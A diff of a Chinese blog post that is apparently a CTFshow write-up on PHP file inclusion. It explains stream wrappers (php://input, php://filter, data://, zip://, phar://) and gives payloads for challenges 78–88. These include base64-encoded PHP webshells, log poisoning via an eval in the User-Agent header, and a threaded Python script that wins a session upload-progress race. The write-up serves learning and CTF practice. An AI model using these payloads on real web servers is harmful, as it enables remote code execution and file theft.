@@ -4,11 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTFshow文件包含, Jlan&#39;s Little World">
+    <meta name="keywords" content="CTFshow文件包含, J1an&#39;s Little World">
     <meta name="description" content="文件包含常见的文件包含漏洞函数：include()，require()
-本地包含利用方式：1、php://input：12?file=php://input请求体内为PHP代码：&amp;lt;?php phpinfo(); ?&amp;gt;
-
-php:">
+本地包含利用方式：1、php://input：?file&amp;#x3D;php:&amp;#x2F;&amp;#x2F;input
+请求体内为PHP代码：&amp;lt;?php phpinfo(">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +19,7 @@ php:">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CTFshow文件包含 | Jlan&#39;s Little World</title>
+    <title>CTFshow文件包含 | J1an&#39;s Little World</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -48,8 +47,6 @@ php:">
 
 
     
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
 
 
 
@@ -67,7 +64,7 @@ php:">
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Jlan&#39;s Little World</span>
+                    <span class="logo-span">J1an&#39;s Little World</span>
                 </a>
             </div>
             
@@ -88,55 +85,11 @@ php:">
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -171,7 +124,7 @@ php:">
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-name">J1an&#39;s Little World</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -194,55 +147,11 @@ php:">
         
         <li class="m-nav-item">
 	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -402,22 +311,28 @@ php:">
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>常见的文件包含漏洞函数：include()，require()</p>
-<h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><h4 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h4><h6 id="1、php-input："><a href="#1、php-input：" class="headerlink" title="1、php://input："></a>1、php://input：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input</span><br><span class="line">请求体内为PHP代码：&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><h4 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h4><h6 id="1、php-input："><a href="#1、php-input：" class="headerlink" title="1、php://input："></a>1、php://input：</h6><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;input
+请求体内为PHP代码：&lt;?php phpinfo(); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input，同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
 <p>遇到file_get_contents()要想到用php://input绕过。</p>
 <span id="more"></span>
 
-<h6 id="2、php-filter："><a href="#2、php-filter：" class="headerlink" title="2、php://filter："></a>2、php://filter：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/rescource=xxx.php</span><br><span class="line">以base64编码读取</span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure>
+<h6 id="2、php-filter："><a href="#2、php-filter：" class="headerlink" title="2、php://filter："></a>2、php://filter：</h6><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;rescource&#x3D;xxx.php
+以base64编码读取
+?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</p>
-<h6 id="3、zip-："><a href="#3、zip-：" class="headerlink" title="3、zip://："></a>3、zip://：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://[压缩包绝对路径]#[压缩包内文件]</span><br></pre></td></tr></table></figure>
+<h6 id="3、zip-："><a href="#3、zip-：" class="headerlink" title="3、zip://："></a>3、zip://：</h6><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;zip:&#x2F;&#x2F;[压缩包绝对路径]#[压缩包内文件]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
 <ul>
@@ -426,10 +341,12 @@ php:">
 <li>只需要是zip的压缩包即可，后缀名可以任意更改。</li>
 <li>相同的类型的还有zlib://和bzip2://</li>
 </ul>
-<h6 id="4、data-："><a href="#4、data-：" class="headerlink" title="4、data://："></a>4、data://：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data://[&lt;MIME-type&gt;][;cherset=&lt;encoding&gt;][;base64],&lt;data&gt;</span><br><span class="line">下面为示例</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=</span><br></pre></td></tr></table></figure>
+<h6 id="4、data-："><a href="#4、data-：" class="headerlink" title="4、data://："></a>4、data://：</h6><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;[&lt;MIME-type&gt;][;cherset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;
+下面为示例
+?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p>
-<h6 id="5、phar-："><a href="#5、phar-：" class="headerlink" title="5、phar//："></a>5、phar//：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://压缩包路径（相对绝对都可）/压缩包内文件</span><br></pre></td></tr></table></figure>
+<h6 id="5、phar-："><a href="#5、phar-：" class="headerlink" title="5、phar//："></a>5、phar//：</h6><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;phar:&#x2F;&#x2F;压缩包路径（相对绝对都可）&#x2F;压缩包内文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>需要phar://有点类似zip://同样可以导致任意代码执行。<del>未来的我补一句，这玩意还是乖乖用来反序列化比较好</del></p>
 <h4 id="可供包含的内容："><a href="#可供包含的内容：" class="headerlink" title="可供包含的内容："></a>可供包含的内容：</h4><h6 id="1、包含Apache日志文件："><a href="#1、包含Apache日志文件：" class="headerlink" title="1、包含Apache日志文件："></a>1、包含Apache日志文件：</h6><h6 id="条件：对日志文件可读并且知道日志文件的存储目录"><a href="#条件：对日志文件可读并且知道日志文件的存储目录" class="headerlink" title="条件：对日志文件可读并且知道日志文件的存储目录"></a><strong>条件：对日志文件可读并且知道日志文件的存储目录</strong></h6><p><strong>注意事项：</strong>一般情况下日志存储目录被修改，需要读取服务器配置文件（httpd，conf，nginx，conf…）或者根据phpinfo()中的信息来得知。还有就是日志记录的信息都可以被调整，比如记录报错的等级或者内容格式。</p>
@@ -444,36 +361,98 @@ php:">
 <h6 id="4、包含临时文件"><a href="#4、包含临时文件" class="headerlink" title="4、包含临时文件"></a>4、包含临时文件</h6><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\Winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
 <p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
 <p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p>
-<h5 id="78"><a href="#78" class="headerlink" title="78"></a>78</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h5 id="78"><a href="#78" class="headerlink" title="78"></a>78</h5><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>无过滤直接伪协议读取flag</p>
-<h5 id="79"><a href="#79" class="headerlink" title="79"></a>79</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload:?file=data://text/plain,&lt;?=eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">POST</span><br><span class="line">cmd=system(&#x27;cat flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">payload:?file=data://text/plain,base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br></pre></td></tr></table></figure>
+<h5 id="79"><a href="#79" class="headerlink" title="79"></a>79</h5><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;eval($_POST[&#39;cmd&#39;]);?&gt;
+POST
+cmd&#x3D;system(&#39;cat flag.php&#39;);
+
+payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>过滤了php，可使用data协议，通过再传入一个参数来执行命令，也可base64解码出想执行的命令</p>
-<h5 id="80"><a href="#80" class="headerlink" title="80"></a>80</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br><span class="line">HEADER</span><br><span class="line">User-Agent=&lt;?php eval($_POST[[&#x27;cmd&#x27;]]);?&gt;</span><br><span class="line">POST</span><br><span class="line">cmd=system(&#x27;cat fl0g.php&#x27;);</span><br></pre></td></tr></table></figure>
+<h5 id="80"><a href="#80" class="headerlink" title="80"></a>80</h5><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log
+HEADER
+User-Agent&#x3D;&lt;?php eval($_POST[[&#39;cmd&#39;]]);?&gt;
+POST
+cmd&#x3D;system(&#39;cat fl0g.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>过滤了data，可通过包含日志来执行命令</p>
-<h5 id="81"><a href="#81" class="headerlink" title="81"></a>81</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br><span class="line">HEADER</span><br><span class="line">User-Agent=&lt;?php eval($_POST[[&#x27;cmd&#x27;]]);?&gt;</span><br><span class="line">POST</span><br><span class="line">cmd=system(&#x27;cat fl0g.php&#x27;);</span><br></pre></td></tr></table></figure>
+<h5 id="81"><a href="#81" class="headerlink" title="81"></a>81</h5><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log
+HEADER
+User-Agent&#x3D;&lt;?php eval($_POST[[&#39;cmd&#39;]]);?&gt;
+POST
+cmd&#x3D;system(&#39;cat fl0g.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>过滤了冒号，日志包含依然可行</p>
 <h5 id="82"><a href="#82" class="headerlink" title="82"></a>82</h5><p>过滤了.，只能包含无后缀文件，在PHP中唯一能控制的无后缀文件就是session文件，所以尝试通过脚本竞争包含写入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原理：在我们自行添加PHPSSEID到网页中时，服务器会自动生成一个文件在/tmp/sess_name，文件名可控。文件内容通过PHP_ SESSION_UPLOAD_PROGRESS参数控制，该参数用于实时获取文件上传进度，会返回一个SESSION，并且该参数的内容将会被加入到sess_name文件中</span><br><span class="line">方法：一边构造POST文件传输请求，将PHP_SESSION_UPLOAD_PROGRESS包含到请求头中，一边包含/tmp/sess_name文件</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">原理：在我们自行添加PHPSSEID到网页中时，服务器会自动生成一个文件在&#x2F;tmp&#x2F;sess_name，文件名可控。文件内容通过PHP_ SESSION_UPLOAD_PROGRESS参数控制，该参数用于实时获取文件上传进度，会返回一个SESSION，并且该参数的内容将会被加入到sess_name文件中
+方法：一边构造POST文件传输请求，将PHP_SESSION_UPLOAD_PROGRESS包含到请求头中，一边包含&#x2F;tmp&#x2F;sess_name文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h5 id="83-86"><a href="#83-86" class="headerlink" title="83-86"></a>83-86</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 竞争万能脚本：</span></span><br><span class="line"><span class="comment"># os.system(&#x27;rm -rf /bin/Azuki&#x27;)</span></span><br><span class="line"><span class="comment"># 消灭Azuki保平安</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://193cefd4-47a6-444e-801b-39906604df13.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#x27;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.get(url + <span class="string">&#x27;?file=/tmp/sess_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(sessID))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]retrying...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
+<h5 id="83-86"><a href="#83-86" class="headerlink" title="83-86"></a>83-86</h5><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># 竞争万能脚本：
+# os.system(&#39;rm -rf &#x2F;bin&#x2F;Azuki&#39;)
+# 消灭Azuki保平安
+import io
+import requests
+import threading
+
+sessID &#x3D; &#39;flag&#39;
+url &#x3D; &#39;http:&#x2F;&#x2F;193cefd4-47a6-444e-801b-39906604df13.challenge.ctf.show&#x2F;&#39;
+
+
+def write(session):
+    while event.isSet():
+        f &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50)
+        response &#x3D; session.post(
+            url,
+            cookies&#x3D;&#123;&#39;PHPSESSID&#39;: sessID&#125;,
+            data&#x3D;&#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#39;&#125;,
+            files&#x3D;&#123;&#39;file&#39;: (&#39;test.txt&#39;, f)&#125;
+        )
+
+
+def read(session):
+    while event.isSet():
+        response &#x3D; session.get(url + &#39;?file&#x3D;&#x2F;tmp&#x2F;sess_&#123;&#125;&#39;.format(sessID))
+        if &#39;test&#39; in response.text:
+            print(response.text)
+            event.clear()
+        else:
+            print(&#39;[*]retrying...&#39;)
+
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    event &#x3D; threading.Event()
+    event.set()
+    with requests.session() as session:
+        for i in range(1, 30):
+            threading.Thread(target&#x3D;write, args&#x3D;(session,)).start()
+
+        for i in range(1, 30):
+            threading.Thread(target&#x3D;read, args&#x3D;(session,)).start()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>87</strong></p>
 <p>先贴一个<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">文章</a></p>
 <p>对于php://filter的使用</p>
 <p>简单版本：使用rot13编解码绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:?file=php://filter/write=string.rot13/resource=1.php（记得进行两次URL编码）</span><br><span class="line">POST:</span><br><span class="line">pbagrag=&lt;?cuc flfgrz(&#x27;gnp s*.cuc&#x27;);?&gt;</span><br><span class="line">&lt;?php system(&#x27;tac f*.php&#x27;);?&gt;经过rot13编码</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;1.php（记得进行两次URL编码）
+POST:
+pbagrag&#x3D;&lt;?cuc flfgrz(&#39;gnp s*.cuc&#39;);?&gt;
+&lt;?php system(&#39;tac f*.php&#39;);?&gt;经过rot13编码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>复杂版本：使用base64编解码绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:?file=php://filter/write=string.rot13/resource=1.php（记得进行两次URL编码）</span><br><span class="line">POST:</span><br><span class="line">pbagrag=&lt;?cuc flfgrz(&#x27;gnp s*.cuc&#x27;);?&gt;</span><br><span class="line">&lt;?php system(&#x27;tac f*.php&#x27;);?&gt;经过rot13编码</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;1.php（记得进行两次URL编码）
+POST:
+pbagrag&#x3D;&lt;?cuc flfgrz(&#39;gnp s*.cuc&#39;);?&gt;
+&lt;?php system(&#39;tac f*.php&#39;);?&gt;经过rot13编码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>原理：在过滤器进行base64编解码时，会绕过所有不属于base64编码后的字符（+, / , 0<del>9,a</del>z,A~Z），比如题中的<code>&lt;?php die(&quot;大佬别秀了&quot;);?&gt;</code>，过滤器识别到的字符只有phpdie，其余的字符被忽略，我们只需要在我们已经编好的base64文本加两个字母即可让phpdiexx被解析为base64编码后语句，与后面代码无关了</p>
 <p><strong>88</strong></p>
 <p>构造语句使得base64编码后只含数字和字母即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:?file=data://text/plain;base64,PD9waHAgICBldmFsKCRfUE9TVFsxXSk7</span><br><span class="line">//&lt;?php   eval($_POST[1]);</span><br><span class="line">POST:</span><br><span class="line">1=system(&#x27;tac f*&#x27;);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgICBldmFsKCRfUE9TVFsxXSk7
+&#x2F;&#x2F;&lt;?php   eval($_POST[1]);
+POST:
+1&#x3D;system(&#39;tac f*&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
                 
             </div>
@@ -490,7 +469,7 @@ php:">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -513,7 +492,7 @@ php:">
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jlan</a>
+                    <a href="/about" target="_blank">J1an</a>
                     !
                 </span>
             </div>
@@ -565,39 +544,6 @@ php:">
                 </div>
             </div>
             
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
-            
         </div>
     </div>
 
@@ -648,7 +594,7 @@ php:">
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -688,7 +634,12 @@ php:">
                     <div class="summary block-with-text">
                         
                             命令执行危险函数：
-1234567891011121314151617181920212223242526272829303132333435363738394041424344454647-------------------------
+------------------------------------------------执行(系统)函数
+	 eval
+	 exec - 执行一个外部程序
+	 shell_exec
+	 system
+	 pass
                         
                     </div>
                     <div class="publish-info">
@@ -698,7 +649,7 @@ php:">
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -729,6 +680,9 @@ php:">
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -837,69 +791,15 @@ php:">
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
